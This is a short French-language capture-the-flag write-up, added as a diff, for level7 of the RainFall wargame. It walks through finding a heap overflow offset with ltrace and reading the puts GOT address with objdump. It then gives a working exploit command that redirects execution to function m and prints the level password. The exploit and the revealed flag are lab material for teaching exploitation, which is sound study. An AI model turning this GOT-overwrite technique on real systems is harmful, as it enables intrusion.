@@ -1,0 +1,38 @@
+Ce binaire peut prendre des arg. si ils sont sup a 2 le binaire renvois ~~ autrement il segfault.
+
+Voir le disas_analys
+
+Pour ce level on a a nouveau une vulnerabilite sur strcpy
+Il est appeller 2 fois au cours de l'exec
+On vois aussi fget qui recupere le contenue de .pass et le store dans une var global c
+
+L'idee de pouvoir remplacer l'execution de la fonction puts par la fonction m. Pour cree un jump qui viendra
+
+Pour commencer on essayer de trouver l'offset
+
+level7@RainFall:~$ ltrace ./level7 $(python -c 'print "B" * 24')
+__libc_start_main(0x8048521, 2, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                                                                       = 0x0804a008
+malloc(8)                                                                                                                                       = 0x0804a018
+malloc(8)                                                                                                                                       = 0x0804a028
+malloc(8)                                                                                                                                       = 0x0804a038
+strcpy(0x0804a018, "BBBBBBBBBBBBBBBBBBBBBBBB")                                                                                                  = 0x0804a018
+strcpy(0x42424242, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Ensuite on recup l'address GOT de puts
+
+level7@RainFall:~$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+
+Puis l'adresse de m qui est 0x080484f4 (voir plus haut lors du disas)
+
+Ensuite il suffit de mettre dans arv1 l'addresse de puts et celle de m dans arv2 ce qui nous donne bien 24 bytes (l'address de puts etant ecraser par celle de m ce qui veut dire qu'on est a 24
+
+level7@RainFall:~$ ./level7 $(python -c 'print "o" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1624023462
+
+
+
